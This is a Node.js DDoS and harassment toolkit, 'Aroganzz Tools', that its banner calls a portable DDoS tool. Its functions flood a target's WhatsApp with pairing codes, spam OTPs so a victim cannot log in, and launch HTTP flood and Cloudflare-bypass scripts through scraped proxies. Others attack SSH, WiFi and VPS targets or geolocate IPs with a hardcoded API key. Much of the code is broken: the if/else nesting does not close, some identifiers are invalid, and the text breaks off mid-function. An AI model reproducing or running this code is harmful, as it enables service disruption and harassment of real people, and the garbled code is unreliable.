#!/usr/bin/env node

const { exec, spawn } = require('child_process')
const readline = require('readline')
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const { parsePhoneNumberFromString } = require('libphonenumber-js');
const pino = require('pino');
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '1.0'
const TelegramBot = require('node-telegram-bot-api');

let theme = 1;
let themeQuestion = '';
let processList = [];

const permen = readline.createInterface({
input: process.stdin,
output: process.stdout
})

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function chTheme() {
permen.question(`
1. Default
2. Bintang
3. Planet
Select Theme:`, async (ntahhlah) => {
let select = parseInt(ntahhlah)
if (select === 1) {
theme = 1;
console.log(`Selected 1`)
await banner(theme);
sigma();
} else if (select === 2) {
theme = 2;
console.log(`Selected 2`)
await banner(theme);
sigma();
} else if (select === 3) {
theme = 3;
console.log(`Selected 3`)
await banner(theme);
sigma();
} else {
console.log(`Invalid Input`)
sigma();
}
})};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function checkSessionAge() {
const filePath = path.join(__dirname, '/lib/sessions.json');
if (!fs.existsSync(filePath)) {
return false;
}

const data = await fs.readFileSync(filePath, 'utf8');
const session = JSON.parse(data);
const loginTime = new Date(session.loginTime);
const currentTime = new Date();

const diffHours = Math.abs(currentTime - loginTime) / 36e5;

if (diffHours > 4) {
return false;
} else {
updateSessionFile();
return true;
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function updateSessionFile() {
const filePath = path.join(__dirname, '/lib/sessions.json');
const currentTime = new Date().toISOString();
try {
await fs.writeFileSync(filePath, JSON.stringify({ loginTime: currentTime }, null, 2), 'utf8');
} catch (err) {
console.error('Error updating session file:', err);
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\


async function askQuestion(query) {
return new Promise((resolve) => {
permen.question(query, resolve);
});
}

async function flNotif() {
const ntahhh = await askQuestion('Input Target Number:');
const phoneNumber = ntahhh.replace(/\D/g, '');

const dur = await askQuestion('Input Duration:');
const duration = parseInt(dur, 10);

if (isNaN(duration) || duration <= 0) {
console.log('Invalid duration input. Please enter a positive number.');
return;
}

async function startFlooder() {
try {
const { version } = await fetchLatestBaileysVersion();
const { state, saveState } = await useMultiFileAuthState('sessions');
const logger = pino({ level: 'silent' });
const conn = makeWASocket({
printQRInTerminal: false,
auth: state,
version: version,
logger: logger,
});

console.log('Attack Started');

let intervalId = setInterval(async () => {
try {
const pairingCode = await conn.requestPairingCode(phoneNumber);
const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
console.log(`[${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}] ${formattedCode} \x1b[32;1mAroganzzTools\x1b[0m`);
} catch (error) {
console.log(error);
}
}, 1000);

setTimeout(() => {
clearInterval(intervalId);
console.log('Flooding stopped.');
sigma();
}, duration * 1000);

} catch (error) {
console.log(error);
}
}

startFlooder();
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function banner(theme) {
if (theme === 1) {
themeQuestion = '[\x1b[1m\x1b[32mAroganzzTools\x1b[0m]: \n';
console.clear()
console.log(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

┏═━═━═━═━═━═━═━═━═━═─═━═━≫
┃ ⌬ Aroganzz ✘ Tools ${version}
┃ ⌬ Owner: AroganzzTeam
┃ ⌬ Premium: true
┃ ⌬ Portable Tools DDoS By AroganzzTeam
┗═━═━═━═━═━═━═━═━═━═─═━═━═━⪼`)

} else if (theme === 2) {
console.clear()
themeQuestion = '[\x1b[1m\x1b[31mroot@user\x1b[0m]: \n';
console.log(`
   ⠀⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀

┏═━═━═━═━═━═━═━═━═━═─═━═━≫
┃ ⌬ Aroganzz ✘ Tools ${version}
┃ ⌬ Owner: AroganzzTeam
┃ ⌬ Premium: true
┃ ⌬ Portable Tools DDoS By AroganzzTeam
┗═━═━═━═━═━═━═━═━═━═─═━═━═━⪼`)
} else if (theme === 3) {
console.clear()
themeQuestion = '[\x1b[1m\x1b[34mControl Command\x1b[0m]: \n';
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉

┏═━═━═━═━═━═━═━═━═━═─═━═━≫
┃ ⌬ Aroganzz ✘ Tools ${version}
┃ ⌬ Owner: AroganzzTeam
┃ ⌬ Premium: true
┃ ⌬ Portable Tools DDoS By AroganzzTeam
┗═━═━═━═━═━═━═━═━═━═─═━═━═━⪼`)
} else {
console.clear()
themeQuestion = '[\x1b[1m\x1b[32mAroganzzTools\x1b[0m]: \n';
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉

┏═━═━═━═━═━═━═━═━═━═─═━═━≫
┃ ⌬ Aroganzz ✘ Tools ${version}
┃ ⌬ Owner: AroganzzTeam
┃ ⌬ Premium: true
┃ ⌬ Portable Tools DDoS By AroganzzTeam
┗═━═━═━═━═━═━═━═━═━═─═━═━═━⪼`)
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function scrapeProxy() {
try {
const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
const data = await response.text();
fs.writeFileSync('proxy.txt', data, 'utf-8');
} catch (error) {
console.error(`Error fetching data: ${error.message}`);
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function scrapeUserAgent() {
try {
const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
const data = await response.text();
fs.writeFileSync('ua.txt', data, 'utf-8');
} catch (error) {
console.error(`Error fetching data: ${error.message}`);
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

function clearProxy() {
if (fs.existsSync('proxy.txt')) {
fs.unlinkSync('proxy.txt');
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

function clearUserAgent() {
if (fs.existsSync('ua.txt')) {
fs.unlinkSync('ua.txt');
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bootup() {
try {
console.log('|| ▓░░░░░░░░░ || 10%');
await exec('npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent')
console.log('|| ▓▓░░░░░░░░ || 20%');
const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
const latestVersion = await getLatestVersion.text();
console.log('|| ▓▓▓░░░░░░░ || 30%');
if (version === latestVersion.trim()) {
console.log('|| ▓▓▓▓▓▓░░░░ || 60%');
const secretBangetJir = await fetch('https://raw.githubusercontent.com/XPanzZyyOfficial/Database/refs/heads/main/database.txt');// Password aroganzzteamxddos
const password = await secretBangetJir.text();
const SessionsTest = await checkSessionAge();
if (SessionsTest === true) {
console.log('Already Logged');
await scrapeProxy();
console.log('|| ▓▓▓▓▓▓▓░░░ || 70%');
await scrapeUserAgent();
console.log('|| ▓▓▓▓▓▓▓▓▓▓ || 100%');
await sleep(700);
console.clear();
console.log(`Welcome To PermenMD Tools ${version}`);
await sleep(1000);
await banner();
console.log('Type "help" For Showing All Available Command');
sigma();
} else if (SessionsTest === false) {
console.log('Login Key Required');
permen.question('[\x1b[1m\x1b[31mPermenMD Security\x1b[0m]: \n', async (skibidi) => {
if (skibidi === password.trim()) {
console.log('Successfully Logged');
await updateSessionFile();
await scrapeProxy();
console.log('|| ▓▓▓▓▓▓▓░░░ || 70%');
await scrapeUserAgent();
console.log('|| ▓▓▓▓▓▓▓▓▓▓ || 100%');
await sleep(700);
console.clear();
console.log(`Welcome To PermenMD Tools ${version}`);
await sleep(1000);
await banner();
console.log('Type "help" For Showing All Available Command');
sigma();
} else {
console.log('Wrong Key');
process.exit(-1);
}
});
} else {
console.log(`ntah`)
}
} else {
console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`);
process.exit();
}
} catch (error) {
console.log('Are You Online?');
console.error(error);
}
}


//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/AttackWifi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question('[\x1b[1m\x1b[31mPermenMD Wifi Killer\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
startKillwiFi.kill('SIGKILL')
console.log(`WiFi Killer Has Ended`)
sigma()
} else {
console.log(`do you mean 'exit'?`)
sigma()
}})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function trackIP(args) {
if (args.length < 1) {
console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
sigma();
return
}
const [target] = args
if (target === '0.0.0.0') {
console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
sigma()
} else {
try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     Tracking IP Address Result
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Flags: ${ipInfo.country_flag}
┃ ⌬ Country: ${ipInfo.country_name}
┃ ⌬ Capital: ${ipInfo.country_capital}
┃ ⌬ City: ${ipInfo.city}
┃ ⌬ ISP: ${ipInfo.isp}
┃ ⌬ Organization: ${ipInfo.organization}
┃ ⌬ lat: ${ipInfo.latitude}
┃ ⌬ long: ${ipInfo.longitude}
┃
┃ ⌬ Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
┗┗━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
sigma()
} catch (error) {
console.log(`Error Tracking ${target}`)
sigma()
}
}
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function pushOngoing(target, methods, duration) {
const startTime = Date.now();
processList.push({ target, methods, startTime, duration })
setTimeout(() => {
const index = processList.findIndex((p) => p.methods === methods);
if (index !== -1) {
processList.splice(index, 1);
}
}, duration * 1000);
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

function ongoingAttack() {
console.log("\nOngoing Attack:\n");
processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
});
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function handleAttackCommand(args) {
if (args.length < 3) {
console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
sigma();
return
}
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     Attack Has Been Launched
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Target : ${target}
┃ ⌬ Duration : ${duration}
┃ ⌬ Methods: ${methods}
┃ ⌬ ISP: ${result.isp}
┃ ⌬ Ip : ${result.query}
┃ ⌬ AS : ${result.as}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/methode/${methods}`);
if (methods === 'api') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
if (methods === 'attackpanel2') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'behindcloudflare') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'bypass') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'bypass1') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'bypass2') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'cf') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
if (methods === 'cf-flood') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'cf-pro') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'cf-good') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'cloudflare') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
if (methods === 'cookie') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'destroy') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
if (methods === 'fire') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'flood') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'floodapi') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
if (methods === 'geckold') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'kill') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'rape') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'raw') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'strom') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'strike') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'thunder') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
if (methods === 'traffic') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
if (methods === 'yat-tls') {
pushOngoing(target, methods, duration)
exec(`node ${target} ${methods} ${duration} 64 proxy.txt --full`)
sigma()
} else if (methods === 'tls') {
pushOngoing(target, methods, duration)
const attackpanel2 = path.join(__dirname, `/lib/methode/attackpanel2`);
const behindcloudflare = path.join(__dirname, `/lib/methode/behind-cloudflare`);
const bypass = path.join(__dirname, `/lib/methode/bypass`);
const bypass1 = path.join(__dirname, `/lib/methode/bypass1`);
const bypass2 = path.join(__dirname, `/lib/methode/bypass2`);
const cf = path.join(__dirname, `/lib/methode/cf`);
const cf-pro = path.join(__dirname, `/lib/methode/cf-pro`);
const cf-good = path.join(__dirname, `/lib/methode/cf-good`);
const cloudflare = path.join(__dirname, `/lib/methode/cloudflare`);
const destroy = path.join(__dirname, `/lib/methode/destroy`);
const flood = path.join(__dirname, `/lib/methode/flood`);
const floodapi = path.join(__dirname, `/lib/methode/floodapi`);
const kill = path.join(__dirname, `/lib/methode/kill`);
const rape = path.join(__dirname, `/lib/methode/rape`);
const raw = path.join(__dirname, `/lib/methode/raw`);
const strom = path.join(__dirname, `/lib/methode/strom`);
const strike = path.join(__dirname, `/lib/methode/strike`);
const thunder = path.join(__dirname, `/lib/methode/thunder`);
const tls = path.join(__dirname, `/lib/methode/tls`);
exec(`node ${attackpanel2} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${behindcloudflare} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${bypass} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${bypass1} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${bypass2} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${cf} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${cf-pro} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${cf-good} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${cloudflare} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${destroy} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${flood} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${floodapi} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${kill} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${rape} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${raw} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${strom} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${thunder} ${target} ${duration} 64 proxy.txt --full`)
exec(`node ${tls} ${target} ${duration} 64 proxy.txt --full`)
sigma()
} else {
console.log(`Method ${methods} not recognized.`);
}
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function killSSH(args) {
if (args.length < 2) {
console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
sigma();
return
}
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     SSH Killer Has Been Launched
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Target : ${target}
┃ ⌬ Duration : ${duration}
┃ ⌬ ISP: ${result.isp}
┃ ⌬ Ip : ${result.query}
┃ ⌬ AS : ${result.as}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/AttackSSH`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function killOTP(args) {
if (args.length < 2) {
console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
sigma();
return
}
const [target, duration] = args
try {
console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     OTP Killer Has Been Launched
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Target : ${target}
┃ ⌬ Duration : ${duration}
┃ ⌬ Methods: ${methods}
┃ ⌬ ISP: ${result.isp}
┃ ⌬ Ip : ${result.query}
┃ ⌬ AS : ${result.as}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/AttackTemp`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function killDo(args) {
if (args.length < 2) {
console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
sigma();
return
}
const [target, duration] = args
try {
console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     VPS Killer Has Been Launched
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Target : ${target}
┃ ⌬ Duration : ${duration}
┃ ⌬ Methods: ${methods}
┃ ⌬ Creator: AroganzzTeam
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`)
} catch (error) {
console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/methode/raw`);
